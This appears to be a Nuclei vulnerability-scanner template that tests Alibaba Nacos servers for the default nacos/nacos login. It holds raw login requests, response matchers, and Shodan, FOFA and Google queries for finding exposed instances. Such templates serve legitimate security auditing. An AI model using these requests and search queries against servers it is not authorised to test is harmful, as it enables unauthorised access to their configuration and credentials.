id: nacos-default-login

info:
  name: Alibaba Nacos - Default Login
  author: SleepingBag945
  severity: high
  description: |
    Nacos default login credentials were discovered.
  classification:
    cpe: cpe:2.3:a:alibaba:nacos:*:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 2
    vendor: alibaba
    product: nacos
    shodan-query: http.title:"nacos"
    fofa-query:
      - title=="nacos"
      - app="nacos"
      - title="nacos"
    google-query: intitle:"nacos"
    runzero-match: any(each(service["html.titles"]), {# matches "(?i)Nacos"})
  tags: nacos,default-login,alibaba

http:
  - raw:
      - |
        POST /v1/auth/users/login  HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Nacos-Server
        Content-Type: application/x-www-form-urlencoded

        username={{username}}&password={{password}}
      - |
        POST /nacos/v1/auth/users/login  HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Nacos-Server
        Content-Type: application/x-www-form-urlencoded

        username={{username}}&password={{password}}

    attack: pitchfork
    payloads:
      username:
        - nacos
      password:
        - nacos
    stop-at-first-match: true

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '"accessToken":'
          - '"username":'
        condition: and

      - type: word
        part: header
        words:
          - 'application/json'

      - type: status
        status:
          - 200

